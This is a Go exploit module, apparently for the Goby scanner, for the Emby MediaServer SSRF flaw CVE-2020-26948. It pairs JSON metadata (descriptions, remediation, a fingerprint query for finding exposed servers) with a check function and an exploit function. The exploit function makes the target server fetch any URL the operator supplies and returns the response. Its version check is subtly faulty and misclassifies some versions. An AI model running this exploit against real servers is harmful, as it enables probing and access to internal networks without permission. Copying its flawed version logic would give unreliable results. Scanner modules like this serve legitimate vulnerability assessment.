package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Emby MediaServer RemoteSearch SSRF (CVE-2020-26948)",
    "Description": "Emby Server before 4.5.0 allows SSRF via the Items/RemoteSearch/Image ImageURL parameter.\\n",
    "Impact": "Emby MediaServer RemoteSearch SSRF (CVE-2020-26948)",
    "Recommendation": "<p>The request port can only be web port, and only HTTP and HTTPS requests can be accessed.</p><p>Restrict the IP that can't access intranet to prevent attacking intranet.</p><p>Mask the returned details.</p>",
    "Product": "Emby-MediaServer",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "Emby Server ImageURL 参数服务器端请求伪造漏洞（CVE-2020-26948）",
            "Description": "<p>Emby 是一个主从式架构的媒体服务器软件，可以用来整理服务器上的视频和音频，并将音频和视频流式传输到客户端设备。<br></p><p>Emby Server 4.5.0 版本之前 Items/RemoteSearch/Image 路径 ImageURL&nbsp; 参数存在 SSRF 漏洞。攻击者可以利用该漏洞扫描外网、服务器所在的内网、本地端口扫描，以及攻击运行在内网或本地的应用程序。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可以利用该漏洞扫描外网、服务器所在的内网、本地端口扫描，以及攻击运行在内网或本地的应用程序。</span><br></p>",
            "Recommendation": "<p><span style=\"font-size: 16px;\"><span style=\"font-size: 16px;\">官方暂未修复该漏洞</span>，用户可自行升级产品至<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">4.5.0 或以上版本</span>：</span><span style=\"font-size: 16px;\"><a href=\"https://www.emby.media/download.html\">https://www.emby.media/download.html</a></span><br></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "emby",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Emby MediaServer RemoteSearch SSRF (CVE-2020-26948)",
            "Description": "Emby Server before 4.5.0 allows SSRF via the Items/RemoteSearch/Image ImageURL parameter.\\n",
            "Impact": "Emby MediaServer RemoteSearch SSRF (CVE-2020-26948)",
            "Recommendation": "<p>The request port can only be web port, and only HTTP and HTTPS requests can be accessed.</p><p>Restrict the IP that can't access intranet to prevent attacking intranet.</p><p>Mask the returned details.</p>",
            "Product": "Emby-MediaServer",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "header=\"X-Emby-Authorization\"",
    "GobyQuery": "header=\"X-Emby-Authorization\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://www.emby.media",
    "DisclosureDate": "2021-06-13",
    "References": [
        "https://github.com/btnz-k/emby_ssrf"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2020-26948"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202010-387"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "http://127.0.0.1",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10222"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			check_uri := "/System/Info/Public"
			uri := "/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://127.0.0.1"
			if strings.Contains(u.HostInfo, ":443") {
				uri = fmt.Sprintf(`/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://127.0.0.1`)
			} else {
				uri = fmt.Sprintf(`/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://127.0.0.1:%s`, u.Port)
			}
			cfg := httpclient.NewGetRequestConfig(check_uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Version") {
					version := regexp.MustCompile(`"Version"\s?:\s?"([^"]+)"`).FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
					version_v1, _ := strconv.Atoi(strings.Split(version, `.`)[0])
					version_v2, _ := strconv.Atoi(strings.Split(version, `.`)[1])
					if version_v1 <= 4 && version_v2 <= 5 {
						if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
							return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "touchicon114.png")
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			check_uri := "/System/Info/Public"
			url := ss.Params["cmd"].(string)
			uri := fmt.Sprintf(`/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=%s`, url)
			cfg := httpclient.NewGetRequestConfig(check_uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Version") {
					version := regexp.MustCompile(`"Version"\s?:\s?"([^"]+)"`).FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
					version_v1, _ := strconv.Atoi(strings.Split(version, `.`)[0])
					version_v2, _ := strconv.Atoi(strings.Split(version, `.`)[1])
					if version_v1 <= 4 && version_v2 <= 5 {
						if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri); err == nil {
							if resp.StatusCode == 200 {
								expResult.Success = true
								expResult.Output = resp.Utf8Html
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
